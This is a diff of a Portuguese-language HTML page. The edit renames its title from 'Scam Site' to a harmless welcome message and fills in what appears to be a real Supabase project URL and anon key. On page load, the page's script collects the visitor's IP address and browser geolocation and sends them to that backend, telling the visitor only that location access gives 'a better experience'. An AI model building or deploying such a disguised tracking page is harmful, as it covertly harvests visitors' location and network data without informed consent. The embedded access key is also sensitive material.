@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scam Site</title>
+    <title>Bem-vindo ao Site</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 </head>
 <body>
@@ -11,9 +11,9 @@
     <p>Por favor, permita o acesso à sua localização para uma melhor experiência.</p>
 
     <script>
-        // Configuração do Supabase
-        const SUPABASE_URL = 'https://your-supabase-url.supabase.co';
-        const SUPABASE_KEY = 'your-supabase-anon-key';
+        // Configuração do Supabase com suas chaves
+        const SUPABASE_URL = 'https://bsbipbftwrwjiepxmbb.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzYmlwYmZ0d3Jyd2ppZXB4bWJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM4NzczNzQsImV4cCI6MjA1OTQ1MzM3NH0.NB9LBMjPZXF2Z7L78S9-3WhrIKeRyfNvJ-hgVLIKd7g';
         const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
         // Função para obter o IP do visitante
@@ -28,7 +28,7 @@
             }
         }
 
-        // Função para obter a localização
+        // Função para obter a localização do visitante
         function getLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -49,7 +49,7 @@
             });
         }
 
-        // Função principal para capturar e enviar dados
+        // Função principal para capturar e enviar os dados
         async function captureAndSendData() {
             const ip = await getIP();
             const location = await getLocation();
@@ -73,11 +73,11 @@
                     console.log('Dados enviados com sucesso!');
                 }
             } catch (error) {
-                console.error('Erro ao enviar dados:', error);
+                console.error('Erro geral ao enviar dados:', error);
             }
         }
 
-        // Executar a função quando a página carregar
+        // Executa a função assim que a página carrega
         window.onload = captureAndSendData;
     </script>
 </body>
